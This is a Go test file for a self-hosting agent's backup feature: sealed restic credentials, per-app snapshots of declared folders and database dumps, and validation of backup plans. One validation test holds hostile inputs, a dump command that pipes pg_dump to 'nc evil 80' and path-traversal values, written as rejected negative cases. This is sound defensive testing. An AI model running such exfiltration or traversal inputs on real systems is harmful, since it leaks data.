package agent_test

import (
	"bytes"
	"context"
	"encoding/json"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/ArjunRachithcf/homerslab/internal/agent"
	"github.com/ArjunRachithcf/homerslab/internal/agent/agenttest"
	"github.com/ArjunRachithcf/homerslab/internal/backup"
	"github.com/ArjunRachithcf/homerslab/internal/testenv"
)

const (
	repoKey  = "0f1e2d3c4b5a69788796a5b4c3d2e1f00f1e2d3c4b5a6978"
	s3Secret = "s3-secret-for-the-test/0123456789"
)

func s3Target() agent.BackupTarget {
	return agent.BackupTarget{Node: "primary", Key: repoKey,
		Target:      backup.Target{Kind: backup.S3, Host: "s3.example.test", Bucket: "household", Path: "homerslab"},
		Credentials: backup.Credentials{AccessKeyID: "HLACCESSKEY", SecretAccessKey: s3Secret}}
}

// withBackups is the ledger app, with what its plan backs up: its library's folder and its database's dump.
func withBackups() agent.AppRequest {
	r := withSecrets()
	r.Backups = []agent.AppData{{Service: "web", Path: "/data/library"},
		{Service: "db", Dump: []string{"pg_dump", "--username=postgres", "ledger"}, File: "ledger.sql"}}
	return r
}

// backingUp is a signed-in primary with the ledger app installed, its volumes where the engine has them, and the
// household's target given.
func backingUp(t *testing.T) (string, *agenttest.Host, string) {
	t.Helper()
	sock, h, state := signedIn(t, agent.Config{})
	install(t, sock, "ledger", withBackups())
	h.Mount("homerslab-ledger", "web", "/data", "/var/lib/docker/volumes/homerslab-ledger_data/_data")
	h.Mount("homerslab-ledger", "web", "/cache", "/var/lib/docker/volumes/homerslab-ledger_cache/_data")
	h.Mount("homerslab-ledger", "db", "/var/lib/postgresql/data", "/var/lib/docker/volumes/homerslab-ledger_db/_data")
	if code, body := call(t, sock, "PUT", "/v1/backups", s3Target()); code != http.StatusOK || !strings.Contains(string(body), "s3:https://s3.example.test/household/homerslab/primary") {
		t.Fatalf("the target: %d %s", code, body)
	}
	return sock, h, state
}

// The node's key and the target's credentials are sealed by the agent as credentials of its own, which restic's unit
// loads; the node's repository is made at the target. No secret is in the agent's state, or on any command line.
func TestTheNodesRepositoryKeyIsACredentialNeverAnArgument(t *testing.T) {
	testenv.Isolate(t)
	sock, h, state := backingUp(t)
	b, err := os.ReadFile(filepath.Join(state, "agent.json"))
	if err != nil || bytes.Contains(b, []byte(repoKey)) || bytes.Contains(b, []byte(s3Secret)) || !bytes.Contains(b, []byte(`"bucket":"household"`)) {
		t.Errorf("the agent's state: %s %v", b, err)
	}
	for _, f := range []string{backup.KeyFile, backup.S3File} {
		sealed, err := os.ReadFile(filepath.Join(state, "backup", f+".cred"))
		if err != nil || !bytes.HasPrefix(sealed, []byte("sealed:")) {
			t.Errorf("%s isn't sealed: %v", f, err)
		}
	}
	runs := h.Restic()
	if len(runs) != 2 || !slices.Contains(runs[0].Argv, "cat") || !slices.Contains(runs[1].Argv, "init") {
		t.Fatalf("making the repository: %+v", runs)
	}
	for _, c := range h.Cmds() {
		if line := c.String() + strings.Join(c.Env, " "); strings.Contains(line, repoKey) || strings.Contains(line, s3Secret) {
			t.Errorf("a secret on a command line: %s", c)
		}
	}
	// Made with the new credentials in a folder of their own, which then takes the old one's place.
	unit := strings.Join(runs[1].Unit, " ")
	if !strings.Contains(unit, "LoadCredentialEncrypted=backup-key:"+filepath.Join(state, "backup.next", "backup-key.cred")) ||
		!strings.Contains(unit, "-E AWS_SHARED_CREDENTIALS_FILE=/run/credentials/") {
		t.Errorf("restic's unit: %s", unit)
	}

	// A repository at the target that the key doesn't open is never made again: the target stays as it was.
	h.FailRestic("cat config", 12)
	other := s3Target()
	other.Target.Bucket = "elsewhere"
	if code, body := call(t, sock, "PUT", "/v1/backups", other); code != http.StatusConflict || !strings.Contains(string(body), "wrong-key") {
		t.Errorf("another key's repository: %d %s", code, body)
	}
	if b, _ := os.ReadFile(filepath.Join(state, "agent.json")); bytes.Contains(b, []byte("elsewhere")) {
		t.Error("the refused target replaced the node's")
	}
	for _, bad := range []func(*agent.BackupTarget){
		func(r *agent.BackupTarget) { r.Key = "short" },
		func(r *agent.BackupTarget) { r.Node = "../other" },
		func(r *agent.BackupTarget) { r.Target.Path = "/homerslab" },
		func(r *agent.BackupTarget) { r.Credentials.SecretAccessKey = "" },
	} {
		r := s3Target()
		bad(&r)
		if code, _ := call(t, sock, "PUT", "/v1/backups", r); code != http.StatusBadRequest {
			t.Errorf("a bad target: %d", code)
		}
	}
}

// Every hour's run backs up exactly what each app's plan said, each item a snapshot of its own: its declared folders,
// found in its volumes on the machine, and its declared dumps, run in their service through the app's own compose
// command; the rest of its volumes, and anything else on the node, never. The sign-in's database is backed up with them.
func TestARunBacksUpExactlyWhatThePlanSaid(t *testing.T) {
	testenv.Isolate(t)
	sock, h, state := backingUp(t)
	before := len(h.Restic())
	code, body := call(t, sock, "POST", "/v1/backups", nil)
	if code != http.StatusOK {
		t.Fatalf("the run: %d %s", code, body)
	}
	var got agent.Backups
	if err := json.Unmarshal(body, &got); err != nil {
		t.Fatal(err)
	}
	var said []string
	for _, r := range got.Results {
		if r.Error != "" || r.Snapshot == "" {
			t.Errorf("%+v", r)
		}
		said = append(said, r.App+r.Platform+" "+r.Data)
	}
	if !slices.Equal(said, []string{"ledger web:/data/library", "ledger db:ledger.sql", "sign-in postgresql:authentik.sql"}) {
		t.Errorf("the run's items: %q", said)
	}
	var backups [][]string
	for _, r := range h.Restic()[before:] {
		if slices.Contains(r.Argv, "backup") {
			backups = append(backups, r.Argv[slices.Index(r.Argv, "backup"):])
		}
		if u := strings.Join(r.Unit, " "); !strings.Contains(u, "CapabilityBoundingSet=CAP_DAC_READ_SEARCH") ||
			!strings.Contains(u, "LoadCredentialEncrypted=backup-key:"+filepath.Join(state, "backup", "backup-key.cred")) || !slices.Contains(r.Argv, "/var/lib/homerslab/backup-cache") {
			t.Errorf("restic's unit: %q %q", r.Unit, r.Argv)
		}
	}
	dir := filepath.Join(state, "apps", "ledger")
	want := [][]string{
		{"backup", "--host", "primary", "--tag", "app=ledger", "--tag", "data=web:/data/library", "--", "/var/lib/docker/volumes/homerslab-ledger_data/_data/library"},
		{"backup", "--host", "primary", "--tag", "app=ledger", "--tag", "data=db:ledger.sql", "--stdin-from-command", "--stdin-filename", "ledger.sql", "--",
			"/usr/bin/docker", "compose", "--project-name", "homerslab-ledger", "--project-directory", dir, "--file", filepath.Join(dir, "compose.yaml"),
			"--file", filepath.Join(dir, "homerslab.yaml"), "exec", "-T", "db", "pg_dump", "--username=postgres", "ledger"},
		{"backup", "--host", "primary", "--tag", "platform=sign-in", "--tag", "data=postgresql:authentik.sql", "--stdin-from-command", "--stdin-filename", "authentik.sql", "--",
			"/usr/bin/docker", "compose", "--project-name", "homerslab-authentik", "--file", "/usr/share/homerslab/sign-in/authentik.compose.yaml",
			"exec", "-T", "postgresql", "pg_dump", "--username=authentik", "--clean", "--if-exists", "authentik"},
	}
	if len(backups) != len(want) {
		t.Fatalf("restic backed up %q", backups)
	}
	for i := range want {
		if !slices.Equal(backups[i], want[i]) {
			t.Errorf("backup %d:\n got %q\nwant %q", i, backups[i], want[i])
		}
	}

	// The manager's database, as the manager hands it over; and prune, on the schedule.
	if code, body := raw(t, sock, "PUT", "/v1/backups/manager", []byte("SQLite format 3\x00…")); code != http.StatusOK || !strings.Contains(string(body), `"snapshot"`) {
		t.Errorf("the manager's database: %d %s", code, body)
	}
	last := h.Restic()[len(h.Restic())-1]
	if !slices.Contains(last.Argv, "--stdin") || !slices.Contains(last.Argv, "platform=manager") || string(last.Stdin) != "SQLite format 3\x00…" {
		t.Errorf("the manager's database: %q", last.Argv)
	}
	if code, body := call(t, sock, "POST", "/v1/backups/prune", nil); code != http.StatusNoContent {
		t.Errorf("prune: %d %s", code, body)
	}
}

// A declared folder the engine has in no volume (its container's own layer) can't be backed up: the run says so, and
// backs up the rest. A failed item says why in a word.
func TestAFolderInNoVolumeIsAFailedItemNotASilentOne(t *testing.T) {
	testenv.Isolate(t)
	sock, h, _ := signedIn(t, agent.Config{})
	install(t, sock, "ledger", withBackups())
	if code, body := call(t, sock, "PUT", "/v1/backups", s3Target()); code != http.StatusOK {
		t.Fatalf("the target: %d %s", code, body)
	}
	h.FailRestic("data=db:ledger.sql", 11)
	_, body := call(t, sock, "POST", "/v1/backups", nil)
	var got agent.Backups
	if err := json.Unmarshal(body, &got); err != nil {
		t.Fatal(err)
	}
	if len(got.Results) != 3 || got.Results[0].Error != "not-in-a-volume" || got.Results[1].Error != "locked" || got.Results[2].Snapshot == "" {
		t.Errorf("the run: %+v", got.Results)
	}
}

// What an app's plan backs up reaches restic's command line, so the agent takes only plain data: a service the
// project runs, an absolute clean folder, or a dump's command of plain arguments and its file's plain name.
func TestAnAppsBackupsAreCheckedBeforeItIsInstalled(t *testing.T) {
	testenv.Isolate(t)
	sock, _, _ := signedIn(t, agent.Config{})
	for want, d := range map[string]agent.AppData{
		"bad-backups":     {Service: "web", Path: "/data/../etc"},
		"bad-backups ":    {Service: "db", Dump: []string{"sh", "-c", "pg_dump | nc evil 80"}, File: "x.sql"},
		"bad-backups  ":   {Service: "db", Dump: []string{"pg_dump"}, File: "../x.sql"},
		"bad-backups   ":  {Service: "web", Path: "/data", Dump: []string{"pg_dump"}, File: "x.sql"},
		"bad-backups    ": {Service: "-web", Path: "/data"},
		"no-such-service": {Service: "worker", Path: "/data"},
	} {
		r := withSecrets()
		r.Backups = []agent.AppData{d}
		if code, body := call(t, sock, "PUT", "/v1/apps/ledger", r); !strings.Contains(string(body), strings.TrimSpace(want)) {
			t.Errorf("%+v: %d %s", d, code, body)
		}
	}
	if code, body := call(t, sock, "POST", "/v1/backups", nil); code != http.StatusConflict || !strings.Contains(string(body), "no-target") {
		t.Errorf("a run without a target: %d %s", code, body)
	}
}

func raw(t *testing.T, sock, method, path string, body []byte) (int, []byte) {
	t.Helper()
	c := http.Client{Transport: &http.Transport{DialContext: func(ctx context.Context, _, _ string) (net.Conn, error) {
		return (&net.Dialer{}).DialContext(ctx, "unix", sock)
	}}}
	req, _ := http.NewRequest(method, "http://agent"+path, bytes.NewReader(body))
	resp, err := c.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	var buf bytes.Buffer
	_, _ = buf.ReadFrom(resp.Body)
	return resp.StatusCode, buf.Bytes()
}
